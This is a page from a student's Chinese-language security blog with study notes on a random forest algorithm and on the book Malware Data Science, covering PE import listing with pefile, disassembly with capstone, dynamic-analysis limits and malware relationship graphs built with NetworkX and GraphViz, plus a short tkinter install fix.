+<h4 id="随机森林"><a href="#随机森林" class="headerlink" title="随机森林"></a>随机森林</h4><p>随机森林算法是决策树的升级版，一次同时训练的不是一棵树而是几百上千个决策树</p>
+<p>最后令每一个决策树来投票</p>
+<p>生成随机森林的过程：</p>
+<ul>
+<li>训练：对每一个树<ul>
+<li>随机从训练样本集中选择一些样本</li>
+<li>建立一棵决策树</li>
+<li>对每一个树，在考虑问题时只考虑部分特征，舍弃其他的特征</li>
+</ul>
+</li>
+<li>检测：<ul>
+<li>对每一棵树运行检测样本的算法</li>
+<li>通过令所有的树投票决定最终分类</li>
+</ul>
+</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://river-li.xyz/2019/07/11/Malware-Data-Science-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.jpg">
+      <meta itemprop="name" content="River Li">
+      <meta itemprop="description" content="WHU 网络空间安全在读">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="River's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2019/07/11/Malware-Data-Science-1/" class="post-title-link" itemprop="url">Malware-Data-Science-1</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-07-11 12:08:41" itemprop="dateCreated datePublished" datetime="2019-07-11T12:08:41+08:00">2019-07-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-09-26 14:47:04" itemprop="dateModified" datetime="2020-09-26T14:47:04+08:00">2020-09-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Malware-Data-Science/" itemprop="url" rel="index"><span itemprop="name">Malware Data Science</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>这本书的前4章内容，主要介绍了一些基本的方法</p>
+<p>pefile是Python的一个库，可以用来操作Exe文件</p>
+<p>这里的内容主要是看<em>Malware Data Science</em>记的笔记</p>
+<!--more--->
+
+
+<h2 id="Basic-Static-Malware-Analysis"><a href="#Basic-Static-Malware-Analysis" class="headerlink" title="Basic Static Malware Analysis"></a>Basic Static Malware Analysis</h2><p>PE文件的格式如图</p>
+
+
+<p>之前都学过，就不怎么说了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pefile</span><br><span class="line">pe = pefile.PE(<span class="string">&quot;ircbot.exe&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> entry <span class="keyword">in</span> pe.DIRECTORY_ENTRY_IMPORT:</span><br><span class="line">    print(entry.dll)</span><br><span class="line">    <span class="keyword">for</span> function <span class="keyword">in</span> entry.imports:</span><br><span class="line">        print(<span class="string">&#x27;\t&#x27;</span>+function.name)</span><br></pre></td></tr></table></figure>
+
+<p>使用pefile这个库打印PE文件导入的dll以及相应的函数</p>
+<h2 id="X86-Disassembly"><a href="#X86-Disassembly" class="headerlink" title="X86 Disassembly"></a>X86 Disassembly</h2><p>这里还有一个库<code>capstone</code></p>
+<p>这是一个开源的反汇编库</p>
+<p>首先是导入库</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pefile</span><br><span class="line"><span class="keyword">import</span> capstone</span><br></pre></td></tr></table></figure>
+
+<p>加载PE文件的方法从前一节可以得知</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pe = pefile.PE(filename)</span><br></pre></td></tr></table></figure>
+<p>一般情况获取到PE文件首先要看入口地址，读取入口地址的函数：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">entrypoint = pe.OPTIONAL_HEADER.AddressOfEntryPoint</span><br><span class="line">entrypoint_address = entrypoint + pe.OPTIONAL_HEADER.ImageBase</span><br></pre></td></tr></table></figure>
+<p>由于入口地址在可选文件头部分，因此也比较容易理解这个接口</p>
+<p>不过我们知道PE文件里写的入口地址没有加上<code>ImageBase</code>,因此实际的地址还要加上这个</p>
+<p>读取出文件中的二进制的方法：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binary_code = pe.get_memory_mapped_image()</span><br></pre></td></tr></table></figure>
+
+<p>读出来的是一个Bytes结构</p>
+<p>下面就涉及另一个库的用法了</p>
+<p>读出文件的二进制之后我们希望能得到汇编的代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">disassembler = capstone.Cs(CS_ARCH_x86, CS_MODE_32)</span><br><span class="line"><span class="keyword">for</span> instruction <span class="keyword">in</span> disassembler.disasm(binary_code, entrypoint_address):</span><br><span class="line">    print(<span class="string">&quot;%s\t%s&quot;</span>,instruction.mnemonic, instruction.op_str)</span><br></pre></td></tr></table></figure>
+<p>首先声明了一个反汇编器，需要指定相应的架构</p>
+<p>之后使用这个汇编器的<code>disasm</code>方法就可以反汇编出相应的代码</p>
+<p>不过有一些程序有反汇编的机制，比如动态的修改自身代码等等</p>
+<p>这种情况下就不是很容易得到正确结果，只有动态调试才比较可行</p>
+<h2 id="Dynamic-Analysis"><a href="#Dynamic-Analysis" class="headerlink" title="Dynamic Analysis"></a>Dynamic Analysis</h2><p>恶意软件的分析一般要分为静态分析和动态分析</p>
+<p>动态分析的过程需要实际的运行</p>
+<p>典型的恶意软件行为：</p>
+<ul>
+<li>修改文件系统</li>
+<li>修改Windows注册表或系统配置</li>
+<li>网络操作</li>
+<li>加载设备驱动（例如Keylogger）</li>
+</ul>
+<p>这里书里推荐了一个网站<a href="malwr.com">malwr.com</a></p>
+<p>基本的动态分析也有一些缺陷</p>
+<p>比如有的程序会检测自身是否处于虚拟环境中</p>
+<p>是的话就不会释放恶意代码</p>
+<p>还有一些行为比如连接了远程服务器后等待接受指令</p>
+<p>但远程的控制服务器一直没有发指令过来，这个过程的分析就无法分析会有哪些行为</p>
+<h2 id="Malware-Network-Analysis"><a href="#Malware-Network-Analysis" class="headerlink" title="Malware Network Analysis"></a>Malware Network Analysis</h2><p>将每一个独立的Malware视为一个节点，将他们之间的关系视为边</p>
+<p>这里的边包含共享代码的关系以及网络行为上的关联</p>
+<p>之后可以得到一个图</p>
+<p>IP地址也可以作为一个点</p>
+<p>这样IP地址或域名以及Malware可以构成一个二分图</p>
+<p>溯源时可以根据这样的原理来找到相同攻击者的样本</p>
+<p>当图中的节点数目比较大时，图中的节点分布可能比较乱，并且难以合理规划位置</p>
+<p>可以使用力导向布局算法简化图的构造</p>
+<p>这个算法原理就是模拟物理世界中弹簧受力</p>
+<p>在拉或者推弹簧时都会有一个趋向原本长度的力</p>
+<p>构造网络用的一个库:<code>NetworkX</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> networkx</span><br><span class="line">network = networkx.Graph()</span><br><span class="line"></span><br><span class="line">nodes = [<span class="string">&quot;hello&quot;</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> node <span class="keyword">in</span> nodes:</span><br><span class="line">    network.add_node(node)</span><br><span class="line"></span><br><span class="line">network.add_edge(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">network.add_edge(<span class="number">1</span>,<span class="number">3</span>)</span><br><span class="line">network.add_edge(<span class="number">1</span>,<span class="string">&quot;hello&quot;</span>)</span><br><span class="line"></span><br><span class="line">networkx.drawing.nx_agraph.write_dot(network,<span class="string">&quot;network.dot&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>上面就是构造图的基本方法</p>
+<p>当需要为节点或边添加额外的属性时只需要在后面加属性即可<br>例如：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">network.add_node(<span class="number">1</span>,myattribute=<span class="string">&quot;foo&quot;</span>)</span><br><span class="line">network.add_edge(<span class="string">&quot;node1&quot;</span>,<span class="string">&quot;node2&quot;</span>,myattribute=<span class="string">&quot;fish&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>需要网络可视化时可以使用<code>GraphViz</code></p>
+<p>这是一个软件包，linux下面可以直接安装</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S graphviz</span><br></pre></td></tr></table></figure>
+<p>用法：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">neato/sfdp/fdp network.dot -T png -o network.png</span><br></pre></td></tr></table></figure>
+
+<p>fdp的意思是绘制成<code>force-directed picture</code>,即前面说的力导向图</p>
+<p>sfdp 是绘制<code>supernodes</code>的fdp</p>
+<p>neato是另一种图，包含了无连接节点的图</p>
+<p>在画图前也可以直接在networkx中设置一些图的属性</p>
+<p>比如节点的颜色、形状、边的宽度等</p>
+<p>也可以直接在图中添加一些标签</p>
+<p>书里还附带了几个脚本提取PE文件中的Host并且构造出图</p>
+<p>这里放上一个有点用的提取Host的函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_hostnames</span>(<span class="params">string</span>):</span></span><br><span class="line">    possible_hostnames = re.findall(<span class="string">r&#x27;(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]&#123;,61&#125;[a-zA-Z0-9])?\.)+[a-zA-Z]&#123;2,6&#125;&#x27;</span>,string)</span><br><span class="line">    valid_hostnames = filter(</span><br><span class="line">    <span class="keyword">lambda</span> hostname: hostname.split(<span class="string">&quot;.&quot;</span>)[<span class="number">-1</span>].lower() <span class="keyword">in</span> valid_hostname_suffixes, possible_hostnames</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> valid_hostnames</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://river-li.xyz/2019/07/08/tkinter%E5%AF%BC%E5%85%A5%E9%94%99%E8%AF%AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.jpg">
+      <meta itemprop="name" content="River Li">
+      <meta itemprop="description" content="WHU 网络空间安全在读">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="River's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2019/07/08/tkinter%E5%AF%BC%E5%85%A5%E9%94%99%E8%AF%AF/" class="post-title-link" itemprop="url">tkinter导入错误</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-07-08 23:36:20" itemprop="dateCreated datePublished" datetime="2019-07-08T23:36:20+08:00">2019-07-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-09-26 14:47:04" itemprop="dateModified" datetime="2020-09-26T14:47:04+08:00">2020-09-26</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>在运行python写的程序时发现无法<code>import tkinter</code>,会报错缺少一个静态链接库</p>
+<p><code>libtk8.5.so</code></p>
+<p>解决办法：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S tk</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+  </nav>
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="River Li"
+      src="/images/head.jpg">
+  <p class="site-author-name" itemprop="name">River Li</p>
+  <div class="site-description" itemprop="description">WHU 网络空间安全在读</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">81</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/river-li" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;river-li" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:lizic0228@gmail.com" title="E-Mail → mailto:lizic0228@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://t.me/river_li" title="Telegram → https:&#x2F;&#x2F;t.me&#x2F;river_li" rel="noopener" target="_blank"><i class="fa fa-telegram fa-fw"></i>Telegram</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.zhihu.com/people/ai-mao-wang-yu-ka-li-bang/" title="知乎 → https:&#x2F;&#x2F;www.zhihu.com&#x2F;people&#x2F;ai-mao-wang-yu-ka-li-bang&#x2F;" rel="noopener" target="_blank"><i class="fa fa-compass fa-fw"></i>知乎</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">River Li</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
